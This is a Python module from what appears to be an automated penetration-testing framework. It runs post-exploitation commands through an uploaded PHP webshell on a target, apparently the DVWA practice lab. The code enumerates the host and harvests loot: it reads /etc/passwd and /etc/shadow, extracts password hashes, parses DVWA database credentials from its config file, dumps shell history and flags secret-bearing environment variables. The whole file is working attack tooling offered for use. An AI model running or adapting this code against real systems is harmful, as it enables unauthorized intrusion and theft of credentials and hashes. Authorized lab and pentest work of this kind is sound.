"""
WebShellPostExploit — post-exploitation via an HTTP PHP webshell.

Used when a custom/cmd_inject step succeeded but no MSF session was opened.
Commands are executed via HTTP GET ?cmd=<command> against the uploaded shell.

The flow:
  1. ExploitExecutor runs custom/file_upload  → uploads shell.php
  2. ExploitExecutor runs custom/cmd_inject   → confirms RCE (attempt.status = SUCCESS)
  3. Orchestrator calls WebShellPostExploit.collect(attempt, target_ip)
     which reuses the same shell URL to run enumeration + loot commands.
"""

from __future__ import annotations

import re

import httpx
from loguru import logger

from artasf.core.models import EngagementSession, ExploitAttempt, LootItem, PostExploitData

# Default paths tried if no TARGETURI in attempt.params
_DEFAULT_SHELL_PATHS = [
    "/dvwa/hackable/uploads/shell.php",
    "/hackable/uploads/shell.php",
    "/uploads/shell.php",
]

_DVWA_CONFIG_PATHS = [
    "/var/www/html/dvwa/config/config.inc.php",
    "/var/www/dvwa/config/config.inc.php",
]

_HISTORY_FILES = ["~/.bash_history", "~/.zsh_history"]


class WebShellSession:
    """
    Execute commands on a remote host via a PHP webshell (?cmd=<command>).

    Args:
        url:     Full URL of the webshell, e.g. http://192.168.56.101:80/dvwa/hackable/uploads/shell.php
        timeout: Per-command HTTP timeout in seconds.
    """

    def __init__(self, url: str, timeout: float = 10.0) -> None:
        self.url     = url
        self.timeout = timeout

    async def run(self, command: str) -> str:
        """Run *command* and return stdout (empty string on failure)."""
        logger.debug("webshell > {}", command)
        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(self.timeout, connect=5.0),
                trust_env=False,
            ) as client:
                resp = await client.get(self.url, params={"cmd": command})
            output = resp.text.strip()
            logger.debug("webshell < {} chars", len(output))
            return output
        except httpx.ReadTimeout:
            # Reverse-shell trigger — connection kept open intentionally
            return "command triggered (timeout)"
        except Exception as exc:
            logger.debug("webshell command failed ({}): {}", command, exc)
            return ""

    async def is_alive(self) -> bool:
        """Return True if the shell responds to a trivial command."""
        out = await self.run("echo artasf_ping")
        return "artasf_ping" in out


class WebShellPostExploit:
    """
    Runs post-exploitation enumeration and loot collection via a webshell.

    Args:
        engagement: Active EngagementSession (loot appended here).
    """

    def __init__(self, engagement: EngagementSession) -> None:
        self.engagement = engagement

    async def collect(
        self,
        attempt: ExploitAttempt,
        target_ip: str,
    ) -> tuple[PostExploitData, list[LootItem]]:
        """
        Run enumeration and loot collection for *attempt*.

        Args:
            attempt:   The successful cmd_inject ExploitAttempt.
            target_ip: Resolved IP of the target (for building the shell URL).

        Returns:
            (PostExploitData, list[LootItem])
        """
        shell_url = _resolve_shell_url(attempt, target_ip)
        shell     = WebShellSession(shell_url)

        logger.info(
            "Web-shell post-exploit on {} (attempt={})",
            shell_url,
            attempt.id[:8],
        )

        # Verify shell is still reachable
        if not await shell.is_alive():
            logger.warning("Web shell at {} did not respond to ping — proceeding anyway", shell_url)

        post_data = await self._enumerate(shell, attempt.target_id)
        loot      = await self._collect_loot(shell, post_data)

        logger.info(
            "Web-shell post-exploit complete: host={} user={} loot={}",
            post_data.hostname, post_data.whoami, len(loot),
        )
        return post_data, loot

    # ------------------------------------------------------------------
    # Enumeration
    # ------------------------------------------------------------------

    async def _enumerate(self, shell: WebShellSession, target_id: str) -> PostExploitData:
        whoami   = await shell.run("id")
        hostname = await shell.run("hostname")
        uname    = await shell.run("uname -a")
        os_raw   = await shell.run("cat /etc/os-release 2>/dev/null")
        os_info  = _parse_os_release(os_raw) or (uname.splitlines()[0] if uname else None)
        ifaces   = _parse_ifaces(
            await shell.run("ip addr 2>/dev/null || ifconfig 2>/dev/null")
        )
        env_text = await shell.run("env 2>/dev/null")
        _flag_interesting_env(env_text)

        return PostExploitData(
            target_id=target_id,
            msf_session_id=None,
            hostname=hostname.splitlines()[0] if hostname else None,
            whoami=whoami.splitlines()[0] if whoami else None,
            os_info=os_info,
            network_ifaces=ifaces,
        )

    # ------------------------------------------------------------------
    # Loot collection
    # ------------------------------------------------------------------

    async def _collect_loot(
        self, shell: WebShellSession, post_data: PostExploitData
    ) -> list[LootItem]:
        items: list[LootItem] = []
        target_id  = post_data.target_id
        session_id = self.engagement.id

        # /etc/passwd
        passwd = await shell.run("cat /etc/passwd 2>/dev/null")
        if passwd:
            items.append(LootItem(
                session_id=session_id, target_id=target_id,
                type="file", value=passwd, source="/etc/passwd",
            ))

        # /etc/shadow (root only)
        shadow = await shell.run("cat /etc/shadow 2>/dev/null")
        if shadow and "Permission denied" not in shadow:
            logger.warning("/etc/shadow readable via webshell — {} entries", shadow.count(":"))
            items.append(LootItem(
                session_id=session_id, target_id=target_id,
                type="hash", value=shadow, source="/etc/shadow",
            ))
            for line in shadow.splitlines():
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] not in ("*", "!", "x", ""):
                    items.append(LootItem(
                        session_id=session_id, target_id=target_id,
                        type="hash", value=f"{parts[0]}:{parts[1]}", source="/etc/shadow",
                    ))

        # DVWA DB config
        for path in _DVWA_CONFIG_PATHS:
            content = await shell.run(f"cat {path} 2>/dev/null")
            if not content:
                continue
            logger.warning("DVWA config found at {} via webshell", path)
            items.append(LootItem(
                session_id=session_id, target_id=target_id,
                type="file", value=content, source=path,
            ))
            for user, pw in _parse_php_credentials(content):
                logger.warning("DB credential from {}: {}:***", path, user)
                items.append(LootItem(
                    session_id=session_id, target_id=target_id,
                    type="credential", value=f"{user}:{pw}", source=path,
                ))
            break

        # Shell history
        for hist_path in _HISTORY_FILES:
            out = await shell.run(f"cat {hist_path} 2>/dev/null | tail -100")
            if not out:
                continue
            items.append(LootItem(
                session_id=session_id, target_id=target_id,
                type="file", value=out, source=hist_path,
            ))

        return items


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _resolve_shell_url(attempt: ExploitAttempt, target_ip: str) -> str:
    """Build the webshell URL from attempt params or fall back to defaults."""
    port = int(attempt.params.get("RPORT", 80))
    uri  = attempt.params.get("TARGETURI", "")
    if uri:
        return f"http://{target_ip}:{port}{uri}"
    # Try to find the URI from a preceding file_upload output stored in params
    upload_uri = attempt.params.get("UPLOAD_URI", "")
    if upload_uri:
        return f"http://{target_ip}:{port}{upload_uri}"
    # Last resort: try the standard DVWA upload path
    return f"http://{target_ip}:{port}{_DEFAULT_SHELL_PATHS[0]}"


def _parse_os_release(text: str) -> str | None:
    m = re.search(r'PRETTY_NAME="?([^"\n]+)"?', text)
    return m.group(1).strip() if m else None


def _parse_ifaces(text: str) -> list[str]:
    addrs = re.findall(r"inet\s+(\d{1,3}(?:\.\d{1,3}){3})", text)
    return [a for a in addrs if not a.startswith("127.")]


def _flag_interesting_env(env_text: str) -> None:
    interesting = re.compile(
        r"(PASSWORD|PASSWD|SECRET|TOKEN|KEY|API_KEY|DATABASE_URL)=(.+)",
        re.IGNORECASE,
    )
    for m in interesting.finditer(env_text):
        logger.warning("Interesting env var via webshell: {}=<redacted>", m.group(1))


def _parse_php_credentials(php: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    # Matches both $_DVWA['db_user'] and $_DVWA[ 'db_user' ] (DVWA uses spaces)
    user_m = re.search(r"\[\s*['\"]?db_user['\"]?\s*\]\s*=\s*['\"]([^'\"]+)['\"]", php)
    pass_m = re.search(r"\[\s*['\"]?db_password['\"]?\s*\]\s*=\s*['\"]([^'\"]*)['\"]", php)
    if user_m and pass_m:
        pairs.append((user_m.group(1), pass_m.group(1)))
    return pairs
